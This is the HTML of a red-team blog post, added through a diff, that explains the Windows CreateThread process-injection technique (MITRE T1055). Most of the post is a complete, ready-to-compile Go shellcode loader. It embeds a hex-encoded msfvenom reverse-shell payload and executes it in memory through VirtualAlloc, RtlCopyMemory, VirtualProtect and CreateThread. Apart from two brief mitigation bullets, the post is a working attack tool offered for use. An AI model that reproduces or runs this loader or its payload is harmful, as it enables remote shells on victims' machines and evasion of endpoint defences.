@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Process Injection -&gt; CreateThread" /><meta property="og:locale" content="en" /><meta name="description" content="MITRE ID : T1055 Tactic : Defense Evasion Platforms: Windows" /><meta property="og:description" content="MITRE ID : T1055 Tactic : Defense Evasion Platforms: Windows" /><link rel="canonical" href="https://cyberkhalid.github.io/posts/createthread/" /><meta property="og:url" content="https://cyberkhalid.github.io/posts/createthread/" /><meta property="og:site_name" content="cyberkhalid" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-01T05:49:33+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Process Injection -&gt; CreateThread" /><meta name="twitter:site" content="@_cyberkhalid" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-01T05:49:33+08:00","datePublished":"2022-04-01T05:49:33+08:00","description":"MITRE ID : T1055 Tactic : Defense Evasion Platforms: Windows","headline":"Process Injection -&gt; CreateThread","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyberkhalid.github.io/posts/createthread/"},"url":"https://cyberkhalid.github.io/posts/createthread/"}</script><title>Process Injection -> CreateThread | cyberkhalid</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="cyberkhalid"><meta name="application-name" content="cyberkhalid"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/cyberkhalid/cyberkhalid/main/cyberl.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">cyberkhalid</a></div><div class="site-subtitle font-italic">Offensive Security || Red Team || Pentester || • 0xCyb3rkh4l1d •</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/cyberkhalid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_cyberkhalid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['root','cyberkhalid.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Process Injection -> CreateThread</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Process Injection -> CreateThread</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/0xcyb3rkh4l1d">cyberkhalid</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648763373" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="917 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h1 id="mitre">MITRE</h1><ul><li>ID : <code class="language-plaintext highlighter-rouge">T1055</code><li>Tactic : <code class="language-plaintext highlighter-rouge">Defense Evasion</code><li>Platforms: <code class="language-plaintext highlighter-rouge">Windows</code></ul><h1 id="createthread">CreateThread</h1><p>Is a function from <code class="language-plaintext highlighter-rouge">Kernel32.dll</code> windows module that Creates a thread to execute within the virtual address space of the calling process.</p><p>Adversaries may leverage the Windows <code class="language-plaintext highlighter-rouge">CreateThread</code> function from Kernel32.dll to execute a malicious code within the virtual address space of the calling process.</p><h2 id="technigues"><span class="mr-2">Technigues</span><a href="#technigues" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h2 id="virtualalloc"><span class="mr-2">VirtualAlloc</span><a href="#virtualalloc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Is a function from <code class="language-plaintext highlighter-rouge">kernel32.dll</code> windows module that reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. We will use this function to <code class="language-plaintext highlighter-rouge">allocate a memory block for our shellcode</code>. By setting the page permissions to <code class="language-plaintext highlighter-rouge">Read/Write</code>, we can be able to copy our malicious code to the allocated memory space.</p><h2 id="rtlcopymemory"><span class="mr-2">RtlCopyMemory</span><a href="#rtlcopymemory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Is a function from <code class="language-plaintext highlighter-rouge">ntdll.dll</code> windows module that copies the contents of a source memory block to a destination memory block. We will use this function to <code class="language-plaintext highlighter-rouge">copy our shellcode to the allocated memory block</code>. For this to work, the destination memory block must have atleast <code class="language-plaintext highlighter-rouge">Read/Write</code> permission set.</p><h2 id="virtualprotect"><span class="mr-2">VirtualProtect</span><a href="#virtualprotect" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Is a function from <code class="language-plaintext highlighter-rouge">kernel32.dll</code> windows module that changes the protection on a region of committed pages in the virtual address space of the calling process. We will use this function to <code class="language-plaintext highlighter-rouge">change the permission of the allocated memory block</code> from Read/Write to <code class="language-plaintext highlighter-rouge">Execute/Read</code>, This permission will allow us to execute our shellcode.</p><h2 id="createthread-1"><span class="mr-2">CreateThread</span><a href="#createthread-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We will use this function to create a thread that will <code class="language-plaintext highlighter-rouge">execute our shellcode</code>.</p><h2 id="waitforsingleobject"><span class="mr-2">WaitForSingleObject</span><a href="#waitforsingleobject" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Is a function from <code class="language-plaintext highlighter-rouge">kernel32.dll</code> windows module that waits until the specified object is in the signaled state or the time-out interval elapses. We will use this function to make the program wait for our shellcode to be executed before exiting.</p><h1 id="code">Code</h1><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+</pre><td class="rouge-code"><pre>
+<span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"encoding/hex"</span>
+	<span class="s">"errors"</span>
+	<span class="s">"log"</span>
+	<span class="s">"unsafe"</span>
+
+	<span class="s">"golang.org/x/sys/windows"</span>
+<span class="p">)</span>
+
+<span class="c">// Reverse Shell Payload Generated With Msfvenom</span>
+<span class="k">const</span> <span class="p">(</span>
+	<span class="n">SHELLCODE</span> <span class="o">=</span> <span class="s">"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020003e8c0a82b0141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5"</span>
+<span class="p">)</span>
+
+<span class="c">// Windows Modules And Functions</span>
+<span class="k">var</span> <span class="p">(</span>
+	<span class="n">kernel32</span> <span class="o">=</span> <span class="n">windows</span><span class="o">.</span><span class="n">NewLazySystemDLL</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)</span>
+	<span class="n">ntdll</span>    <span class="o">=</span> <span class="n">windows</span><span class="o">.</span><span class="n">NewLazySystemDLL</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
+
+	<span class="n">virtualAlloc</span>        <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">NewProc</span><span class="p">(</span><span class="s">"VirtualAlloc"</span><span class="p">)</span>
+	<span class="n">rtlCopyMemory</span>       <span class="o">=</span> <span class="n">ntdll</span><span class="o">.</span><span class="n">NewProc</span><span class="p">(</span><span class="s">"RtlCopyMemory"</span><span class="p">)</span>
+	<span class="n">virtualProtect</span>      <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">NewProc</span><span class="p">(</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
+	<span class="n">createThread</span>        <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">NewProc</span><span class="p">(</span><span class="s">"CreateThread"</span><span class="p">)</span>
+	<span class="n">waitForSingleObject</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">NewProc</span><span class="p">(</span><span class="s">"WaitForSingleObject"</span><span class="p">)</span>
+<span class="p">)</span>
+
+<span class="c">// Main Function</span>
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Process Injection: CreateThread..."</span><span class="p">)</span>
+
+	<span class="c">// Convert SHELLCODE From hex String to bytes</span>
+	<span class="n">shellcodeByte</span> <span class="o">:=</span> <span class="n">decodeShellcode</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">)</span>
+
+	<span class="c">// Variables Needed To Invoke VirtualAlloc</span>
+	<span class="k">var</span> <span class="n">shellcodeSize</span> <span class="kt">uint32</span> <span class="o">=</span> <span class="kt">uint32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcodeByte</span><span class="p">))</span>
+	<span class="k">var</span> <span class="n">flAllocationType</span> <span class="kt">uint32</span> <span class="o">=</span> <span class="n">windows</span><span class="o">.</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">windows</span><span class="o">.</span><span class="n">MEM_RESERVE</span>
+	<span class="k">var</span> <span class="n">flProtect</span> <span class="kt">uint32</span> <span class="o">=</span> <span class="n">windows</span><span class="o">.</span><span class="n">PAGE_READWRITE</span>
+
+	<span class="c">//Invoke VirtualAlloc To Allocate Memory Block For Our Shellcode</span>
+	<span class="n">bAddr</span><span class="p">,</span> <span class="n">errVirtualAllocProc</span> <span class="o">:=</span> <span class="n">virtualAllocProc</span><span class="p">(</span><span class="n">shellcodeSize</span><span class="p">,</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">flProtect</span><span class="p">)</span>
+	<span class="n">exitError</span><span class="p">(</span><span class="n">errVirtualAllocProc</span><span class="p">)</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Memory Allocated At: "</span><span class="p">,</span> <span class="kt">uintptr</span><span class="p">(</span><span class="n">bAddr</span><span class="p">))</span>
+
+	<span class="c">//Invoke RtlCopyMemory To Copy Our Shellocode To The Allocated Memory.</span>
+	<span class="n">errRtlCopyMemoryProc</span> <span class="o">:=</span> <span class="n">rtlCopyMemoryProc</span><span class="p">(</span><span class="n">bAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcodeByte</span><span class="p">[</span><span class="m">0</span><span class="p">],</span> <span class="n">shellcodeSize</span><span class="p">)</span>
+	<span class="n">exitError</span><span class="p">(</span><span class="n">errRtlCopyMemoryProc</span><span class="p">)</span>
+
+	<span class="c">//Variable Needed To Invoke VirtualProtect</span>
+	<span class="k">var</span> <span class="n">flNewProtect</span> <span class="kt">uint32</span> <span class="o">=</span> <span class="n">windows</span><span class="o">.</span><span class="n">PAGE_EXECUTE_READ</span>
+
+	<span class="c">//Invoke VirtualProtect To Change Permission Of The Allocated Memory Block To Execute/Read</span>
+	<span class="n">errVirtualProtectProc</span> <span class="o">:=</span> <span class="n">virtualProtectProc</span><span class="p">(</span><span class="n">bAddr</span><span class="p">,</span> <span class="n">shellcodeSize</span><span class="p">,</span> <span class="n">flNewProtect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flProtect</span><span class="p">)</span>
+	<span class="n">exitError</span><span class="p">(</span><span class="n">errVirtualProtectProc</span><span class="p">)</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Permission Changed To PAGE_EXECUTE_READ"</span><span class="p">)</span>
+
+	<span class="c">//Invoke CreateThread To Execute Our Shellcode</span>
+	<span class="n">tHandle</span><span class="p">,</span> <span class="n">errCreateThreadProc</span> <span class="o">:=</span> <span class="n">createThreadProc</span><span class="p">(</span><span class="n">bAddr</span><span class="p">)</span>
+	<span class="n">exitError</span><span class="p">(</span><span class="n">errCreateThreadProc</span><span class="p">)</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Shellcode Executed"</span><span class="p">)</span>
+
+	<span class="c">//Invoke WaitForSingleObject To Wait For Our Shellcode To Be Executed Completely.</span>
+	<span class="n">errWaitForSingleObjectPro</span> <span class="o">:=</span> <span class="n">waitForSingleObjectProc</span><span class="p">(</span><span class="n">tHandle</span><span class="p">)</span>
+	<span class="n">exitError</span><span class="p">(</span><span class="n">errWaitForSingleObjectPro</span><span class="p">)</span>
+
+<span class="p">}</span>
+
+<span class="c">// ExitError Handles Errors</span>
+<span class="k">func</span> <span class="n">exitError</span><span class="p">(</span><span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c">//DecodeShellcode Convert Shellcode to Bytes Array</span>
+<span class="k">func</span> <span class="n">decodeShellcode</span><span class="p">(</span><span class="n">shellcode</span> <span class="kt">string</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
+	<span class="n">shellcodeByte</span><span class="p">,</span> <span class="n">errShellcode</span> <span class="o">:=</span> <span class="n">hex</span><span class="o">.</span><span class="n">DecodeString</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">errShellcode</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s">"[-] Error Decoding Shellcode"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">shellcodeByte</span>
+<span class="p">}</span>
+
+<span class="c">// virtualAllocProc Allocates Memory Block</span>
+<span class="k">func</span> <span class="n">virtualAllocProc</span><span class="p">(</span><span class="n">dwSize</span><span class="p">,</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">flProtect</span> <span class="kt">uint32</span><span class="p">)</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">bAddr</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">errVirtualAlloc</span> <span class="o">:=</span> <span class="n">virtualAlloc</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">dwSize</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">flAllocationType</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">flProtect</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">errVirtualAlloc</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">errVirtualAlloc</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"The operation completed successfully."</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="m">0</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"[-] Error: VirtualAlloc"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">bAddr</span><span class="p">,</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="c">// rtlCopyMemoryProc Copies Shellcode to The Allocated Memory Block</span>
+<span class="k">func</span> <span class="n">rtlCopyMemoryProc</span><span class="p">(</span><span class="n">destination</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="n">source</span> <span class="o">*</span><span class="kt">byte</span><span class="p">,</span> <span class="n">size_t</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">errRtlCopyMemory</span> <span class="o">:=</span> <span class="n">rtlCopyMemory</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">destination</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="n">source</span><span class="p">)),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">size_t</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">errRtlCopyMemory</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">errRtlCopyMemory</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"The operation completed successfully."</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"[-] Error: RtlCopyMemory"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="no">nil</span>
+
+<span class="p">}</span>
+
+<span class="c">// virtualProtectProc Changes The Permission To Execute/Read</span>
+<span class="k">func</span> <span class="n">virtualProtectProc</span><span class="p">(</span><span class="n">lpAddress</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">flNewProtect</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">floldProtect</span> <span class="o">*</span><span class="kt">uint32</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">errVirtualProtect</span> <span class="o">:=</span> <span class="n">virtualProtect</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span>
+		<span class="n">lpAddress</span><span class="p">,</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">dwSize</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">flNewProtect</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="n">floldProtect</span><span class="p">)))</span>
+
+	<span class="k">if</span> <span class="n">errVirtualProtect</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">errVirtualProtect</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"The operation completed successfully."</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"[-] Error: VirtualProtect"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="c">// createThreadProc Executes Shellcode</span>
+<span class="k">func</span> <span class="n">createThreadProc</span><span class="p">(</span><span class="n">lpStartAddress</span> <span class="kt">uintptr</span><span class="p">)</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">tHandle</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">errCreateThread</span> <span class="o">:=</span> <span class="n">createThread</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">),</span>
+		<span class="n">lpStartAddress</span><span class="p">,</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">),</span>
+		<span class="kt">uintptr</span><span class="p">(</span><span class="m">0</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">errCreateThread</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">errCreateThread</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"The operation completed successfully."</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">tHandle</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"[-] Error: CreateThread"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">tHandle</span><span class="p">,</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="c">// waitForSingleObjectProc Wait For Shellcode.</span>
+<span class="k">func</span> <span class="n">waitForSingleObjectProc</span><span class="p">(</span><span class="n">tHandle</span> <span class="kt">uintptr</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">errWaitForSingleObject</span> <span class="o">:=</span> <span class="n">waitForSingleObject</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span>
+		<span class="n">tHandle</span><span class="p">,</span>
+		<span class="m">0xFFFFFFFF</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">errWaitForSingleObject</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">errWaitForSingleObject</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"The operation completed successfully."</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"[-] Error: WaitForSingleObject"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+</pre></table></code></div></div><h1 id="execution">Execution</h1><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread1.png" alt="createthread" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread3.png" alt="createthread" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread2.png" alt="createthread" data-proofer-ignore></p><h1 id="mitigations">Mitigations</h1><ul><li>Behavior Prevention on Endpoint.<li>Privileged Account Management.</ul><h1 id="references">References</h1><ul><li><p><a href="https://attack.mitre.org/techniques/T1055/">https://attack.mitre.org/techniques/T1055/</a></p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</a></p><li><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory</a></p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject</a></p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red Teaming</a>, <a href='/categories/defense-evasion/'>Defense Evasion</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Process Injection -&gt; CreateThread - cyberkhalid&amp;url=https://cyberkhalid.github.io/posts/createthread/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Process Injection -&gt; CreateThread - cyberkhalid&amp;u=https://cyberkhalid.github.io/posts/createthread/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a 